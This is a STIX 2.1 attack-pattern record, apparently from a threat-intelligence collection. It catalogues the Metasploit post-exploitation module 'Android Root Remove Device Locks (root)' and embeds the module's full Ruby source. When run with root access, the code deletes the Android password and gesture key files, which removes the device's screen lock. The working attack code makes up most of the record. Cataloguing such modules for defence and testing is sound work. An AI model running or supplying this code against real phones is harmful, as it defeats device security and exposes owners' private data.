{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--65aba01c-077e-497c-a5b2-9745747315ca",
    "created": "2024-08-14T16:33:01.851149Z",
    "modified": "2024-08-14T16:33:01.851154Z",
    "name": "Android Root Remove Device Locks (root)",
    "description": " This module uses root privileges to remove the device lock. In some cases the original lock method will still be present but any key/gesture will unlock the device.  'Privileged' => true 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/android/manage/remove_lock_root.rb",
            "external_id": "remove_lock_root.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Common\n  include Msf::Post::Android::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Android Root Remove Device Locks (root)',\n          'Description' => %q{\n            This module uses root privileges to remove the device lock.\n            In some cases the original lock method will still be present but any key/gesture will\n            unlock the device.\n          },\n          'Privileged' => true,\n          'License' => MSF_LICENSE,\n          'Author' => [ 'timwr' ],\n          'SessionTypes' => [ 'meterpreter', 'shell' ],\n          'Platform' => 'android'\n        }\n      )\n    )\n  end\n\n  def run\n    unless is_root?\n      print_error('This module requires root permissions.')\n      return\n    end\n\n    %w[\n      /data/system/password.key\n      /data/system/gesture.key\n    ].each do |path|\n      print_status(\"Removing #{path}\")\n      cmd_exec(\"rm #{path}\")\n    end\n\n    print_status('Device should be unlocked or no longer require a pin')\n  end\nend\n",
    "x_mitre_platforms": [
        "android"
    ]
}